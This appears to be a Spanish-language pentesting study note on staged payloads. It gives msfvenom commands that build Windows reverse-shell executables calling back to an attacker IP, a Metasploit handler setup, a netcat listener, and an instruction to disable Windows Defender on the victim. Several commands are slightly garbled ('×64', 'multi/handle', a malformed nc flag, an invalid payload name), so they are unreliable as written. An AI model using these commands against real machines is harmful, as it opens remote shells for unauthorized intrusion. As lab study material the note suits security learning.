------------
Tags: #payload #payloadstaged #metasploit #windows #netcat #nc #rlwrap

----------
**Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.

-----------
## Con metasploit

Creamos un binario malicioso con msfvenom para crear un ejecutable y después utilizamos metasploit.
1. Creamos el binario y lo descargamos en la máquina víctima:
```bash
msfvenom -p windows/×64/meterpreter/tcp --platform windows -a ×64 LHOST=192.168.111.45 LPORT=4646 -f exe -o reverse. exe
```
(Hay que desactivar el windows defender)
2. Utilizamos metasploit:
```bash
msfdb run
```

```metasploit
use exploit/multi/handle
set payload windows/x64/meterpreter/reverse_tcp
show options

run
```
---------
## Con Netcat

## Con Netcat

Descargamos en la máquina víctima el ejecutable creado con el siguiente comando:
```bash
msfvenom -p windows/×64/shell_reverse_tcp --platform Windows -a ×64 LHOST=192.168.111.45 LPORT=4646 -f exe -o shell.exe
```

En la máquina atacante escuchamos por un puerto con netcat:
```bash
rlwrap nc -nlcp 4646
```

**rlwrap** es una herramienta que simula una consola interactiva.

---------
